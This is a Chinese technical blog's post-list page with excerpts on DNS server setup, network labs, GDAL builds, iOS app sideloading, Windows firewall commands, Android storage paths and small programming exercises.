<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9569b26aa3b76e59e74aabe236b60573/" rel="bookmark">
			Linux CentOS 8（DNS的配置与管理）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux CentOS 8（DNS的配置与管理）
目录 一、DNS相关知识1.1 DNS简介1.2 DNS的解析原理1.3 DNS解析 二、DNS服务器部署2.1 不使用chroot模式启动DNS2.2 使用chroot模式DNS 三、DNS配置文件详解3.1 主配文件详解3.2 区域数据库文件详解 四、项目实施4.1 主DNS4.2 辅助DNS（DNS服务器冗余）4.3 转发DNS4.4 智能DNS 一、DNS相关知识 1.1 DNS简介 DNS
DNS域名系统（英文：Domain Name System)是一个域名系统，是万维网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。DNS协议运行在UDP协议之上，使用端口号53。
域名
域名是一个网站的逻辑地址，比如www.baidu.com，相比IP地址更加方便人类记忆，所以被广泛使用。
域名管理机构
Internet 域名与地址管理机构（ICANN）是为承担域名系统管理，IP地址分配，协议参数配置，以及主服务器系统管理等职能而设立的非盈利机构.现由IANA和其他实体与美国政府约定进行管理。域名分国际域名和国内域名两种，对于国际域名而言，其命名规则是：域名可以由（a-z、A-Z大小写等价）26个英文字母、数字（0-9）以及连接符“-”组成，但是域名的首位必须是字母或数字。对于域名的长度也有一定的限制：国际通用顶级域名长度不得超过26个字符，中国国家顶级域名长度不得超过20个字符。
1.2 DNS的解析原理 目前，因特网的命名方法是层次树状结构的方法。采用这种命名方法，任何一个连接在因特网上的主机或设备，都有一个某一层次结构的名字，即域名(domain name)。域是名字空间中一个可被管理的划分。域可以继续按层次划分为子域，如二级域、三级域等等，如图1所示。
图1 1.3 DNS解析 递归解析
主机向本地域名服务器的解析，一般都是采用递归解析。如果主机所询问的本地域名服务器不知道被查询域名的 IP 地址，那么本地域名服务器就以 DNS 客户的身份，向其他根域名服务器继续发出查询请求报文。
迭代解析
本地域名服务器向根域名服务器的查询，通常是采用迭代解析。当根域名服务器收到本地域名服务器的迭代查询请求报文时，要么给出所要查询的 IP 地址，要么告诉本地域名服务器：“你下一步应当向哪一个域名服务器进行查询”。然后让本地域名服务器进行后续的查询。
域名的解析也分为正向解析和反向解析。正向解析为：将域名解析为IP；反向解析为：将IP解析为域名。
二、DNS服务器部署 DNS服务是由bind程序提供的，所以要实现DNS服务就需要安装bind程序包。
[root@localhost ~]# yum install bind bind-chroot -y DNS主程序包
bind-chroot 是DNS的安全包，可以改变默认DNS根目录，将DNS运行在监牢模式。bind-chroot是 bind 的一个功能，使 bind 可以在一个chroot的模式下运行。也就是说，bind 运行时的/(根)目录，并不是系统真正的/(根)目录，只是系统中的一个子目录而已。这样做的目的是为了提高安全性。因为在 chroot 的模式下，bind 可以访问的范围仅限于这个子目录的范围里，无法进一步提升，进入到系统的其他目录中。bind 的默认启动方式就是 chroot 方式。Bind Chroot DNS 服务器的默认“监牢”为 /var/named/chroot。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9569b26aa3b76e59e74aabe236b60573/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c94f677cc104d7199303552129e51b04/" rel="bookmark">
			Cisco Packet Tracer——校园网搭建实验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Cisco Packet Tracer——校园网搭建实验 校园网搭建
1.1校园网络总体概述
随着网络技术的发展和网络产品价格不断的下调，众多学校开始搭建自己学校的网络平台，组建自己的校园网络。现有一家中学——文都中学，学校划分为多个单位及区域，总务处，教务处，二级学院，教学楼，图书馆，体育馆，宿舍。
为校内有相似的职能部门划分相同的vlan，通过网络中心进行集中管理。同时配置ACL（Access Control List）权限，实现网络的安全访问。设置ftp， www的服务器，为校内提供一些基本的网络服务功能。
1.2校园网络基本要求
实现学校对教学楼，图书馆，学生宿舍，二级学院的统一高效的网络管理
搭建校级行政管理系统。
实现教务处与总务处二级学院间的信息互通，让办公高效化，现代化。提高学校个各个部门的互联互通性。
实现各个各个部门资源共享，通过计算机内的设置，不同部门间可以相互访问对方的信息资源。
实现不同区域的信息互联互通，宿舍区域与教学区域的链接，让学生可以轻松的获得学校的学习资源。
2 网络设计原则
2.1网络需求调研与系统设计的基本原则
从充分调查入手，充分理解用户业务活动和用户信息需求；
在调查、分析的基础上，在充分考虑需求与约束(经费、工作基础与技术等方面)的前提之下，对网络系统组建与信息系统开发的可行性进行充分地论证，避免盲目性；
运用系统的观念，完成网络工程技术方案的规划和设计；
根据工程时间的要求，将网络系统组建的任务按照设计、论证、实施、验收、用户培训、维护的不同阶段进行安排；对于大中型网络系统的建设，需要聘请专业的监理公司对项目执行的全过程进行监理；
强调各阶段文档资料的完整性与规范性。
2.2网络工程设计总体原则
1、先进性与现实性:作为中国教育科研网的一部分， 校园网网络系统处的信息量将会十分庞大，要求计算机网络有很高的工作效率。而且随着教学科研任务工作的迅速系统面临的任务也愈来愈艰巨，所以，我们设计的网络在技术上必须体现高度的先进性。技术上的先进性讲保证处理数据的高效率，保证系统工作的灵活性，保证网络的可靠性，也使系统的扩展和维护变得简单。
2、系统与软件的可靠性:在校园网络系统设计中，很重要的一点就是网络的可靠性和稳定性。在外界环境或内部条件发生突变时，怎样使系统保持正常工作，或者在尽量短的时间内恢复正常工作，是校园网网络系统所必须考虑的。在设计时对可靠性的考虑，可以充分减少或消除因意外或事故造成的损失。我们将从网络线路的冗余备份及信息数据的多种备份等方面保证校园网网络系统的可靠性。
3、系统安全性与保密性:随若计算机技术的发展，尤其是网络和网络间互联的规模的扩大信息和网络的安全性日益受到重视，面临十分严肃的安全性挑大网政讯:时业从内源访向 控制和外部防火墙两方面保证校园网网络系统的安全。
4、易管理与维护:校园网网络系统的节点数日大，分布范围广，通信戒指多种多样，采用的网络技术也较先进，尤其引入交换式网络和虚拟网之后，网络的管理任务加重了，如何有效地管理好网络关系，是否充分有效地利用网络的系统资源等问题就摆在我们面前。有图形化的管理界面和简洁的操作方式，可以提供强大的网络管理功能，使网络日常的维护和操作变得直观、简便和高效。
3 设计方案
3.1 网络设备选型
3.1.1 网络设备选择
网络设备规模需求如下表所示：
设备型号
设备类型
数量（台）
Cisco 2811
路由器
4
Cisco 3650-24PS
三层交换机
2
Cisco 2950-24
二层交换机
8
3.1.2 服务器设备选择
校园网需要实现邮件服务、文件传输服务、web服务须配备相应的服务器，为了实现统一我们需要对服务器进行相应的配置。web服务器不但要保证整个系统得稳定性和安全性，还要保证系统的不间断的运行，而且要保持高效率的运行，使服务器能提供不间断的高速的外部访问。因此选用1台曙光天阔I650(R)机架式服务器作为WEB服务器。同样建议学校在以后的使用过程加持曙光S1100 SCSI盘阵技术作为WEB服务器的硬盘备份，来进一步提高WEB服务器的数据的安全性。
3.2 网络方案拓扑设计
通过对文都学校校园网需求的分析，设计了如下图所示的网络拓扑图：
通过创建VLAN，可以在一个局域网中，分割广播域。校园网的vlan划分如下表所示
3.1 vlan划分
IP地址划分如下表所示
表3.2 IP地址划分
表3.3 设备详细信息
4 网络方案设计
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c94f677cc104d7199303552129e51b04/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/93002f78a8c570c38cb35b5b4d5de890/" rel="bookmark">
			Dirac‘s BRA and KET notation
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		from kets to bras expansions the operater matrix elements to operator for example griffiths 习题3.22
adjoint of a linear operator Hermitian and Uniraty Operators Hermitian operator defination:
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d577eee78b87524bd8124fdd87f7787f/" rel="bookmark">
			linux篇---修改图片权限
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 linux篇—修改图片权限 find . -name "*.jpg" | xargs chmod +r find . -name "*.jpg" | xargs sudo chmod -x find . -name "*.jpg" | xargs ls -l 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/802bb900c87ec72b2eab2ed3312acfe1/" rel="bookmark">
			ubuntu从源码编译gdal
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		删除旧版本 sudo apt remove libgdal* sudo apt remove gdal* sudo apt autoremove 下载geos、proj和gdal https://github.com/libgeos/geos/releases
这里使用的是3.12.1版本：
https://github.com/OSGeo/PROJ/releases
这里使用的是9.3.0版本：
https://github.com/OSGeo/gdal/releases
这里使用的是3.7.3版本：
编译 安装依赖包
sudo apt install libsqlite3-0 libtiff5 libtiff5-dev curl libcurl4 libcurl4-gnutls-dev 解压文件：
sudo tar xvfj geos-3.12.1.tar.bz2
sudo tar xvf proj-9.3.0.tar.gz
sudo tar xvf gdal-3.7.3.tar.gz
编译GEOS
cd geos-3.12.1 sudo mkdir build cd build sudo cmake -DCMAKE_BUILD_TYPE=Release -DCMAKE_INSTALL_PREFIX=/usr/local .. sudo make -j20 sudo make install 编译PROJ
cd proj-9.3.0 sudo mkdir build cd build sudo cmake .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/802bb900c87ec72b2eab2ed3312acfe1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ebdb1653de36a024b0dde21b018e5c12/" rel="bookmark">
			手机 IOS 软件 IPA 签名下载安装详情图文教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于某些应用由于某些原因无法上架到 appStore 或者经过修改过的软件游戏等无法通过 appStore 安装，我们就可以使用签名的方式对相应软件的IPA文件进行签名然后安装到你的手机上
这里我们使用爱思助手进行签名安装，爱思助手支持两种方式，一种证书签名还有一种 apple ID 签名，签名后也可以直接通过爱思将签名后的软件安装到手机上，比较方便
证书签名 首先我们下载爱思助手
https://www.hereitis.cn/soft/i4
然后在爱思助手工具箱中找到IPA签名工具，如图
打开签名工具后，我们点击左上角的“添加 IPA 文件”，选择我们需要签名安装的软件的IPA砸壳包
然后点击导入证书，选择用于签名的证书以及描述文件，添加完证书以后输入证书密码点击确定就可以了
如果你没有证书也可以通过 Apple ID 进行签名
然后我们选中我们需要签名的软件和要使用的签名证书，然后点击下方的开始签名，就可以了
我们签名完成后，打开已签名文件夹，找到我们签名后的 IPA 文件
然后在爱思助手的我的设备处点击导入安装，选择我们签名过的IPA安装包就可以了
Apple ID 签名 如果我们没有证书文件也可以使用 apple ID 进行签名，Apple ID 签名只能支持7天，7天后还需要重新签名安装
同样我们在爱思助手工具箱中打开签名工具，然后添加好IPA文件，然后点击下方的 使用 Apple ID 签名，然后点击添加 Apple ID
如上图填入我们需要安装的手机的 appID 和 密码，然后在设备标识处选择相对应的手机，这里需要我们在操作前就将手机连接到我们的爱思助手上
然后我们选择需要签名的软件IPA，然后选择刚刚添加的Apple ID，点击下方的开始签名就可以了
签名成功后也是如证书签名中所说的一样找到我们签名后的IPA文件，然后导入安装就可以了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ef1da2f0a69ac819cfa0211c36d1c27/" rel="bookmark">
			关闭windows防火墙命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 关闭windows防火墙命令
打开windows PowerShell (管理员) 或 CMD (管理员)
指令：
查看当前防火墙状态：netsh advfirewall show allprofiles 关闭防火墙：netsh advfirewall set allprofiles state off 开启防火墙：netsh advfirewall set allprofiles state on 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4bdc8e4241d49decc6ea2ed1ffe5a8dd/" rel="bookmark">
			CrystalDiskInfo/CrystalDiskMark/DiskGenius系统迁移
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CrystalDiskInfo
主要用于看硬盘的各种信息，包括但不限于硬盘通电时间、通电次数、硬盘好坏状态
CrystalDiskMark
主要用于测试硬盘的读写速度、连续读写速度
DiskGenius
主要用于通过U盘装操作系统后进行，磁盘分区，更改磁盘名、隐藏部分区（更改后选中硬盘，点击保存分区表）等还可以进行同一电脑上两块硬盘进行系统迁移， 比如我买了一个新硬盘装在电脑上，我可以通过系统迁移，直接把旧硬盘李的系统拷贝到新硬盘里，这样就可以不用给新硬盘装系统，装环境了注意在系统迁移后，重启进入bios后，更改默认启动盘
如上图，微星b450，是在硬盘BBS优先权里设置
这样弄完后，在开机启动后就可以通过f11切换硬盘来切换系统了，下图是选择不同的系统后的截图
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/87369bcbed5ba335e0bda3e05144797f/" rel="bookmark">
			商品购物管理与推荐系统Python&#43;Django网页界面&#43;协同过滤推荐算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、介绍 商品管理与推荐系统。本系统使用Python作为主要开发语言，前端采用HTML、CSS、BootStrap等技术搭建显示界面，后端采用Django框架处理用户的请求响应。
创新点：使用协同过滤算法，以用户对商品的评分作为依据，在猜你喜欢界面中实现对当前登录用户的个性化推荐。
主要功能有：
系统分为用户和管理员两个角色。用户可以登录、注册、查看商品、购买商品、添加购物车、发布评论、对商品进行评分、查看购物车、编辑个人信息、充值等操作管理员在后台管理系统中可以对用户和商品进行管理 二、系统功能效果图片展示 三、演示视频 and 代码 and 安装 地址：https://www.yuque.com/ziwu/yygu3z/qsszw5siwwf2vtf3
四、协同过滤算法介绍 协同过滤算法是一种广泛应用于推荐系统的技术，它基于一个简单的假设：如果两个人在过去喜欢相同的东西，那么他们在将来也有可能喜欢相似的东西。这种算法通常分为两类：基于用户的协同过滤和基于物品的协同过滤。
基于用户的协同过滤：这种方法首先找出与目标用户兴趣相似的其他用户，然后根据这些相似用户的喜好来推荐物品给目标用户。基于物品的协同过滤：与之相反，这种方法先找出与目标物品相似的其他物品，然后把这些物品推荐给那些喜欢目标物品的用户。 现在，让我们用Python实现一个简单的基于用户的协同过滤算法。我们将创建一个小型的电影评分数据集，并基于用户的评分相似性来推荐电影。
import numpy as np # 创建一个用户-电影评分矩阵 ratings = np.array([ [5, 4, 1, 1, 3], [3, 2, 1, 3, 3], [4, 3, 3, 1, 5], [3, 3, 1, 2, 4], [1, 5, 5, 2, 1], ]) def cosine_similarity(v1, v2): """计算两个向量之间的余弦相似度""" return np.dot(v1, v2) / (np.linalg.norm(v1) * np.linalg.norm(v2)) def recommend_movies(ratings, user_index): """为指定用户推荐电影""" scores = [] target = ratings[user_index] for i, user_ratings in enumerate(ratings): if i !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/87369bcbed5ba335e0bda3e05144797f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/12217cb72e993a3337f3ff1d2b7c2a5f/" rel="bookmark">
			gpio-export配置默认gpio
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		gpio-export配置默认gpio 用于设置gpio的默认状态和导出用户空间借口。只需要在设备树中配置节点即可。
参考链接：
https://linux-arm-kernel.infradead.narkive.com/QRDUydDE/patch-0-2-gpio-allow-userspace-export-from-dt#post9
https://devicetree.vger.kernel.narkive.com/hUDm3uhy/patch-gpio-add-export-with-name-from-dts
1. 驱动源码分析 导入头文件： #include &lt;linux/device.h&gt; #include &lt;linux/err.h&gt; #include &lt;linux/errno.h&gt; #include &lt;linux/module.h&gt; #include &lt;linux/io.h&gt; #include &lt;linux/gpio/consumer.h&gt; #include &lt;linux/of.h&gt; #include &lt;linux/of_address.h&gt; #include &lt;linux/of_gpio.h&gt; #include &lt;linux/pinctrl/pinctrl.h&gt; #include &lt;linux/slab.h&gt; #include &lt;linux/init.h&gt; #include &lt;linux/platform_device.h&gt; 定义驱动的数据结构：
struct gpio_export_gpio{ char *name; // 节点名称 struct gpio_desc *desc; // gpio描述 }; struct gpio_export{ struct device *dev; // 用于绑定相关的设备 int gpios_num; // 记录一共需要导出的节点数量，在卸载驱动时用于取消导出 struct gpio_export_gpio *gpios; // 导出的每一个gpio的信息 }; 定义驱动的 of_match_table :
static struct of_device_id gpio_export_ids[] = { { .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/12217cb72e993a3337f3ff1d2b7c2a5f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8f123c26c91cd0159bfa82397dacd752/" rel="bookmark">
			ipv4 PPPoE接入互联网
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、组网需求。 设备作为Client，通过PPPoE协议向运营商设备拨号后获得IP地址，实现接入Internet。
局域网内所有PC都部署在10.3.0.1/24网段，均通过DHCP方式动态获得IP地址。
下行链路：连接公司内的所有PC。
上行链路：向运营商申请Internet接入服务。运营商提供的Internet接入服务使用PPPoE协议。
根据以上情况，需要将FW作为PPPoE Client，向PPPoE Server（运营商设备）拨号获得IP地址、DNS地址后，实现接入Internet。
PPPoE接入Internet组网图：
2、配置思路。 配置下行链路。
在接口GigabitEthernet 1/0/3上开启DHCP Server服务，为PC动态分配IP地址，指定PC获得的网关和DNS Server地址均为接口GigabitEthernet 1/0/3的IP地址。
PC上网通常需要解析域名，这就需要为其指定DNS Server地址。本例中FW作为DNS Relay设备。
配置上行链路，采用PPPoE方式获取IP地址和DNS Server地址。
将FW各个接口加入到安全区域，并配置安全策略。
将连接公司局域网的接口加入到高安全等级的区域（trust），将连接Internet的上行接口加入到低安全等级的区域（untrust）。
配置NAT策略。
局域网内通常使用私网地址，必须经过地址转换后才能访问Internet。本例中，因为上行接口通过拨号获得IP地址，每次拨号获得的IP地址可能不同，所以配置采用Easy IP方式的NAT策略。
3、ipv4 PPPoE接入互联网实验。 实验拓扑： 1、FW1配置。 ##基础IP地址配置 [FW1]int g1/0/3 [FW1-GigabitEthernet1/0/3]ip add 10.3.0.1 24 [FW1-GigabitEthernet1/0/3]q —————————————————————————————— ##安全区域配置 [FW1]firewall zone trust [FW1-zone-trust]add int g1/0/3 [FW1-zone-trust]q [FW1]firewall zone untrust [FW1-zone-untrust]add int g1/0/1 [FW1-zone-untrust]q —————————————————————————————— ##开启dhcp [FW1]dhcp enable —————————————————————————————— ##创建接口地址池 [FW1]int g1/0/3 [FW1-GigabitEthernet1/0/3]dhcp select interface [FW1-GigabitEthernet1/0/3]dhcp server ip-range 10.3.0.1 10.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8f123c26c91cd0159bfa82397dacd752/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/847a12a6de1a9a664a6cf6f3e693dbc8/" rel="bookmark">
			最前端｜低代码平台轻松设计可视化图表【内含网站资源】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在前端设计中，我们经常需要使用可视化图表来呈现数据和信息。然而，每次都要自己从头开始设计图表未免太过繁琐。为了解决这个问题，我们调研了low code平台上的可视化图表功能。
本篇文章为大家带来以下问题的解答：
（1）low code 中“可视化图表分类组件”有哪些？
（2）可以在哪里找到 low code“可视化图表”的前端/设计资源？
目录
一、low code介绍
二、low code 可视化图表分类
三、low code“可视化图表”的资源
四、总结
一、low code介绍 低代码（Low-Code）是一种快速设计和开发软件应用程序并且手动编码最少的方法。它可以为技术人员提供更快，更可靠的价值。通过在图形界面中使用可视化建模来组装和配置应用程序，开发人员可以跳过所有基础架构让开发速度提升起来
二、low code 可视化图表分类 我们调研了 datav、Dooring、Raydata 光启光数据可视化的工具，其中可视化图表大致可以分“29”种不同的图表
low code 可视化图表 29 种分类中的分组 分组下的设计形式链接：
https://www.figma.com/file/Zj87SKT9PgYBSsfr691knY/Untitled?node-id=0%3A1&amp;t=duOdYHc1BFhXwZqP-1
三、low code“可视化图表”的资源 部分“前端”可视化图表资源整合： 可以在Gutup（https://github.com/）中进行搜索，以查找已经集成了可视化图表的现有资源。
Gutup是一个面向开发人员的社交平台，提供了许多与开发相关的资源和工具。通过在Gutup上搜索可视化图表，可以找到许多可用的集成资源，这些资源可以帮助大家更快地创建各种类型的图表。
部分“设计”可视化图表资源整合： 可以在 figma 社区搜索中去搜索可视化图表，Figma的社区搜索中，用户可以寻找到与设计相关的各种Charts资源。包括各种类型的可视化图表，如折线图、柱状图、饼图等，适用于各种场景，如数据可视化、报表生成等。
四、总结 我们在调研low code工具的过程中，通过快速的构建和定制，能够轻松地搭建出自己想要的内容。为了实现这一目标，我们需要大量的模块组件，并且这些组件的样式也需要多样化。
low code可视化图表具有29种分类和具体的分组，这些分类包括折线图、柱状图、饼图等常见的图表类型，同时也包括一些较为特殊的图表类型，如热力图、树状图等。我们还需要知道如何寻找合适的资源（前端/设计）来辅助我们设计可视化图表。在low code平台上，我们可以从资源库中查找可视化图表分类组件，也可以通过搜索引擎或社交媒体等途径找到其他类似的资源。 公众号搜索【神州数码云基地】回复关键词【可视化图表】，获取文中可视化图表资源
版权声明:本文由神州数码云基地团队整理撰写，若转载请注明出处。
公众号搜索神州数码云基地，了解更多技术干货。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d3b6e943e3d0b5341f80499d94fc1b8/" rel="bookmark">
			BE节点经常挂掉：[IO_ERROR]failed to list /proc/27349/fd/: No such file or directory
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近BE节点经常挂掉
Caused by: java.lang.RuntimeException: Failed to execute internal SQL. org.apache.doris.common.UserException: errCode = 2, detailMessage = There is no scanNode Backend available.[10031: not alive] OriginStatement{originStmt='SELECT * FROM __internal_schema.column_statistics WHERE tbl_id=27273 AND idx_id=-1 AND col_id='CREATE_AID'', idx=0} at org.apache.doris.qe.StmtExecutor.executeInternalQuery(StmtExecutor.java:2509) at org.apache.doris.statistics.util.StatisticsUtil.execStatisticQuery(StatisticsUtil.java:131) at org.apache.doris.statistics.StatisticsRepository.loadColStats(StatisticsRepository.java:439) at org.apache.doris.statistics.ColumnStatisticsCacheLoader.loadFromStatsTable(ColumnStatisticsCacheLoader.java:56) at org.apache.doris.statistics.ColumnStatisticsCacheLoader.doLoad(ColumnStatisticsCacheLoader.java:38) at org.apache.doris.statistics.ColumnStatisticsCacheLoader.doLoad(ColumnStatisticsCacheLoader.java:31) at org.apache.doris.statistics.StatisticsCacheLoader.lambda$asyncLoad$0(StatisticsCacheLoader.java:48) at java.util.concurrent.CompletableFuture$AsyncSupply.run(CompletableFuture.java:1590) ... 3 more Caused by: org.apache.doris.common.UserException: errCode = 2, detailMessage = There is no scanNode Backend available.[10031: not alive] at org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1d3b6e943e3d0b5341f80499d94fc1b8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01a929b7e5f0ae60a38597d188dbafb4/" rel="bookmark">
			存储访问框架来获取外部存储路径，获取公共目录下指定类型文件夹的路径
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 存储访问框架来获取外部存储路径，获取公共目录下指定类型文件夹的路径
if (android.os.Build.VERSION.SDK_INT &gt;= android.os.Build.VERSION_CODES.R) { // 获取存储访问框架的根路径 File file = context.getExternalFilesDir(null); // 获取存储访问框架下指定类型文件夹的路径 file = context.getExternalFilesDir(Environment.DIRECTORY_PICTURES); String path = file.getAbsolutePath(); } else { // 获取公共目录下指定类型文件夹的路径 File file = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES); String path = file.getAbsolutePath(); } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e8254830872aa382fdb3973d48c12ee/" rel="bookmark">
			【网络】网口工作模式（混杂模式|监听模式|监视模式|管理模式）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		常见的网口工作模式：
1. 普通模式/非混杂模式（Non-Promiscuous Mode）： 默认工作模式。网卡只接收发给本机的包（包括广播包）传递给上层程序，其它的包一律丢弃。
2.混杂模式（Promiscuous Mode）： 接收所有经过网卡的数据包，包括不是发给本机的包，即不验证MAC地址。
3. 监听模式（Listen Mode）： 监听传入的数据包并将其记录下来，但不会进行实际处理或回复。监听模式主要用于网络故障排查和诊断。
4.监视模式（Monitor Mode）： 主动地捕获和分析网络流量，包括接收和发送的数据包。监视模式通常用于网络安全和分析，以便检测和识别潜在的安全威胁、监视网络活动或进行网络性能优化。监视模式可以捕获整个网络流量，而不仅仅局限于工具所在的网络接口。
（无线网卡上推出的监视模式可分为"监视"和"混杂"两个子模式。其中，"监视"模式只可以捕捉本 SSID（Wi-Fi名称）内的数据包，"混杂"模式则可以捕捉所有经过无线网卡的数据包）
5. 管理模式（Management Mode）： 网卡接收和处理管理帧，用于配置和监控网络设备的状态和性能。
需要注意的是，这些工作模式的具体名称和功能可能会因操作系统、网络设备型号和软件驱动程序的不同而有所差异。因此，在具体的网络设备或工具文档中查阅相关信息是确保准确理解各个工作模式的最佳方式。
监听模式和监视模式的区别是？ 监听模式是一种被动模式，仅监听传入的数据包并记录它们，但不会对数据包进行任何实际处理或回复。
监视模式是一种主动模式，主动地捕获和分析网络流量，包括接收和发送的数据包。通常用于网络安全和分析，以便检测和识别潜在的安全威胁、监视网络活动或进行网络性能优化。监视模式可以捕获整个网络流量，而不仅仅局限于工具所在的网络接口。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4989e26e0d27e91fbff9d642a24952ea/" rel="bookmark">
			输出所有的“水仙花数”，所谓水仙花数是指一个3位数，其各位数字的立方和等于该数本身。例如：153是一个“水仙花数”，因为153=1^3&#43;2^3&#43;3^3.
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目： 输出所有的“水仙花数”，所谓水仙花数是指一个3位数，其各位数字的立方和等于该数本身。 思路：
1：是三位数
2：个位的三次方+十位的三次方+百位的三次方=数
所以我们分别求出三位数的个十百位，再比较就行啦！
以下是用python写出的程序：
代码如下：
for i in range(100,1000): a=i%10#个位 b=int(i%100/10)#十位 c=int(i/100)#百位 if a*a*a+b*b*b+c*c*c==i: print(i) 运行结果：
以下是用java写出的程序：
代码如下：
public class demo { public static void main(String[] args) { for (int i = 100; i &lt; 1000; i++) { // 个位数 int a = i % 10; // 十位数 int b = i % 100 / 10; // 百位数 int c = i / 100; if(a*a*a + b*b*b + c*c*c == i){ System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4989e26e0d27e91fbff9d642a24952ea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa343876292146a324a384d4694ea8d3/" rel="bookmark">
			两种计时函数详解(1.clock（）； 2.getTickCount（）)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录：
1.clock（）；
2.getTickCount（）；
1.c/c++提供的clokc（）函数
**· **clock_t clock (void);
**· **引用头文件：#inlcude&lt;time.h&gt; / **· **函数返回值类型：clock_t ，参数为空；
使用前 可以先定义两个clock_t类型的变量，如：clock_t begin ，end；
然后分别用这两个变量记录调用函数前后的clock（）
最后cout输出，输出时应注意以下几点：
在（end - begin） 后 ，需要除上 CLOCKS_PER_SEC * 1000，这样算出来就是毫秒；由于变量类型是clock_t ，所以还需要强制转换为float/double； 下面见代码示例：
#include&lt;iostream&gt; #include&lt;opencv2\opencv.hpp&gt; using namespace std; using namespace cv; void BGRToGray(Mat &amp;src, Mat &amp;dest) { dest.create(src.rows,src.cols, CV_8UC1); for (int r = 0; r &lt; src.rows; r++) { for (int c = 0; c &lt; src.cols; c++) { Vec3b &amp; m = src.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aa343876292146a324a384d4694ea8d3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
